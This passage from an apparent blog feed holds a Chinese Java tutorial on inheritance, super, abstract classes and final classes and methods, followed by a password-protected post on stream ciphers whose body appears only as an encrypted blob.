class="token punctuation">{</span>          <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">PrintNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span>           <span class="token punctuation">{</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token operator">--</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>             <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>                     B b<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   b<span class="token punctuation">.</span><span class="token function">PrintNumber</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token punctuation">}</span>   <span class="token punctuation">}</span>输出结果：<span class="token number">99</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;<br><font face="Comic sans MS"><strong>2.3.4 📒方法的添加：</strong><br><font color="red"><strong>子类可以新加一些方法，以针对子类实现相应的功能.</strong></font><br></font></p><p>&emsp;<br>&emsp;</p><h5 id="2-4-静态成员变量的继承"><font color="#3CB371" face="Comic sans MS">2.4  静态成员变量的继承</font><a href="post/Java-Inherit-4#2-4-静态成员变量的继承"></a></h5><p><font face="Comic sans MS">(1)某类的静态成员为该类及该类的所有子类所共有；<br>(2)如果子类中新定义的静态成员变量与父类中的某个静态成员变量同名，则这两个静态成员变量相互独立。</font></p><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> b<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//静态属性</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">test</span> <span class="token keyword">extends</span> <span class="token class-name">a</span><span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    test<span class="token punctuation">.</span>b<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">}</span>输出结果：<span class="token number">20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">living</span><span class="token punctuation">{</span>       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//静态属性               </span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">human</span> <span class="token keyword">extends</span> <span class="token class-name">living</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//静态属性</span>       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>               human<span class="token punctuation">.</span>age<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>               System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>living<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>   <span class="token punctuation">}</span>输出结果：<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="2-5-super的使用"><font color="#3CB371" face="Comic sans MS">2.5  super的使用</font><a href="post/Java-Inherit-4#2-5-super的使用"></a></h4><p><font color="red" face="Comic sans MS">super：代表父类对象，在继承中有重要的作用</font><br><font face="Comic sans MS">📒<strong>使用情况：</strong><br>(1)  子类隐藏了超类中的变量或方法，而在程序中又要使用超类中被隐藏的变量或方法时<br><font color="red">&emsp;&emsp;格式：super.变量 ;  super.方法([参数表])</font><br>(2)  在子类的构造方法中引用超类的构造方法时<br><font color="red">&emsp;&emsp;格式： super([参数表])<br>📒<strong>注意:</strong>  构造方法不能被继承，但是子类的构造方法能确保它的直接父类<br>和间接父类的构造方法都被调用，但是注意一点：<strong>子类构造方法中调用父类构造方法时，调用语句必须放在子类构造方法中的第一句.</strong></font></font><br>&emsp;<br>&emsp;<br><font face="Comic sans MS"><br><strong>1.  📒使用super访问父类的属性和方法</strong><br><img src="https://i.loli.net/2018/12/26/5c232ab96c4be.png" alt="1.png"><br>&emsp;<br>&emsp;<br><strong>2.  📒使用super在子类中调用父类的构造方法</strong><br><img src="https://i.loli.net/2018/12/26/5c23311cb1dd4.png" alt="2.png"></font></p><p>&emsp;<br><strong>3.  📒使用super的注意事项</strong><br>(1)通过super不仅可以访问直接父类中定义的属性和方法，还可以访问间接父类中定义的属性和方法。<br>(2)由于它指的是父类对象，所以super不能在static环境中使用，包括类变量、类方法和static语句块。<br>(3)使用super不能访问本类定义的属性和方法。<br>(4)在构造方法中使用super时，super语句必须放在第一句<br>(5)在子类的构造方法中，super可以不明确使用，也可以明确使用。<br></p><p>&emsp;<br><font face="Comic sans MS"><strong>4.  📒明确使用super调用父类构造方法</strong></font></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Point</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    Point（<span class="token keyword">int</span> x）<span class="token punctuation">{</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token punctuation">}</span>｝<span class="token keyword">class</span> <span class="token class-name">MapPoint</span> <span class="token keyword">extends</span> <span class="token class-name">Point</span><span class="token punctuation">{</span><span class="token function">MapPoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//明确使用</span>　System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MapPoint()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>　　<span class="token keyword">new</span> <span class="token class-name">MapPoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token punctuation">}</span>｝<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;<br><font face="Comic sans MS"><strong>5.  📒不明确使用super调用父类构造方法</strong></font><br><font color="#FF6347">&emsp;<strong>当父类重载自己的构造函数时，在子类的构造函数中要明确写出到底是使用父类的哪一个构造函数！！！否则编译器不知道在子类中到底是调用父类的哪一个构造方法！</strong><br></font></p><p><font color="red"><strong>如下:</strong></font></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Point</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    Point（<span class="token keyword">int</span> x）<span class="token punctuation">{</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token punctuation">}</span>｝<span class="token keyword">class</span> <span class="token class-name">MapPoint</span> <span class="token keyword">extends</span> <span class="token class-name">Point</span><span class="token punctuation">{</span><span class="token function">MapPoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>　System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MapPoint()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>　　<span class="token keyword">new</span> <span class="token class-name">MapPoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token punctuation">}</span>｝<span class="token comment" spellcheck="true">//编译会出错</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font face="楷体">答案：因为子类中没有明确使用super，系统会自动在构造方法中加上super()，来调用直接父类的不带参数的构造方法，由于Point类中没有定义不带参数的构造方法，所以编译通不过。以上代码相当于：<br></font></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Point</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    Point（<span class="token keyword">int</span> x）<span class="token punctuation">{</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token punctuation">}</span>｝<span class="token keyword">class</span> <span class="token class-name">MapPoint</span> <span class="token keyword">extends</span> <span class="token class-name">Point</span><span class="token punctuation">{</span><span class="token function">MapPoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>　<span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//此处不能缺省</span>　System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MapPoint()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>　　<span class="token keyword">new</span> <span class="token class-name">MapPoint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><strong>解决方法：</strong><br>(1)在MapPoint的构造方法中，明确使用super来调用父类已有的构造方法，如super(3);<br>(2)在Point中加入一个不带参数的构造方法，如Point{} 　　　　　<br>(3)去掉Point中全部的构造方法，则编译器会自动加入一个不带参数的构造方法，称为缺省构造方法。</p><p>&emsp;<br><strong>6.  📒构造方法的调用顺序</strong><br><font color="red"><strong>一个复杂对象的构造方法调用顺序如下：</strong></font></p><p>(1)首先调用父类的构造方法。这个步骤会反复递归，使继承阶层的根源最先被构建，然后是次一层的子类，直至最末一层子类为止；（即先调用最根部的父类，然后依次调用该父类的子类的子类的……..）<br>(2)根据各个成员的声明顺序，执行成员变量的初始化赋值；<br>(3)执行该构造方法中的各语句</p><p>&emsp;<br>&emsp;</p><h3 id="三、-抽象类与抽象方法abstract"><font color="#FF6347" face="Comic sans MS">三、 抽象类与抽象方法abstract</font><a href="post/Java-Inherit-4#三、-抽象类与抽象方法abstract"></a></h3><p><font color="red" face="Comic sans MS"><strong>类似于它是一个模板！！！</strong></font></p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">(1)abstract关键字修饰的类和方法(2)抽象类不能创建任何对象，抽象类必须产生其子类，由子类创建对象。(3)抽象类中可以包含抽象方法，也可以不包含抽象方法，但如果类中的某一方法是抽象的，整个类就必须被说    明成抽象的。 (4)抽象方法在子类中必须被实现，否则子类仍是抽象的。(5)抽象类不是可有可无的。(6)(类、成员方法、成员属性)访问权限修饰符为abstract。</font></td></tr></table></div></div><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span>例<span class="token number">4</span><span class="token operator">-</span><span class="token number">17</span><span class="token punctuation">]</span>  抽象类举例<span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>  <span class="token keyword">abstract</span>  <span class="token keyword">double</span>  <span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>                                          <span class="token comment" spellcheck="true">//上述方法对一般图形无法定义其实现</span><span class="token keyword">class</span> <span class="token class-name">Rectangle</span>  <span class="token keyword">extends</span> <span class="token class-name">Shape</span>  <span class="token punctuation">{</span><span class="token keyword">int</span> width<span class="token punctuation">;</span>                               <span class="token keyword">int</span> length<span class="token punctuation">;</span>                       <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">area</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//矩型类实现了Shape类的抽象方法area()</span>   <span class="token keyword">return</span> width<span class="token operator">*</span>length<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">draw</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  … …     <span class="token comment" spellcheck="true">//矩型类实现了Shape类的抽象方法draw()，详细可由自己完成} </span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="四、-final类和final方法"><font color="#FF6347" face="Comic sans MS">四、 final类和final方法 </font><a href="post/Java-Inherit-4#四、-final类和final方法"></a></h3><h4 id="4-1-final类"><font color="#3CB371" face="Comic sans MS">4.1  final类</font><a href="post/Java-Inherit-4#4-1-final类"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">如果一个类被final修饰符所修饰和限定，说明这个类不能被继承，即不可能有子类——最终类             例如：*java.lang.System***📒作用：**final修饰符通常是出于安全的目的而使用的，因为不能继承final类，人们就不能重载或覆盖它的任何方法。如果允许一个类被继承，其允许被重载或覆盖的方法可能会被改写。保证某个特定的方法在类层次关系上的某层以后只有一个定义，这对于那些安全性非常关键的类是非常必要的。</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="4-2-final方法"><font color="#3CB371" face="Comic sans MS">4.2  final方法</font><a href="post/Java-Inherit-4#4-2-final方法"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">final修饰符所修饰的方法，是不能被子类所覆盖的方法。📒**作用：**固定了这个方法所对应的具体操作，可以防止子类对父类关键            方法的错误的重定义，保证了程序的安全性和正确性。📒**注意：**所有已被private修饰符限定为私有的方法，以及所有包含在final类中的方法，都被默认为是            final的。            因为这些方法不可能被子类所继承，所以不可能被重载，自然都是最终的方法。</font></td></tr></table></div></div><p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对称密码-序列密码</title>
      <link href="/post/Sequence-Password/"/>
      <url>/post/Sequence-Password/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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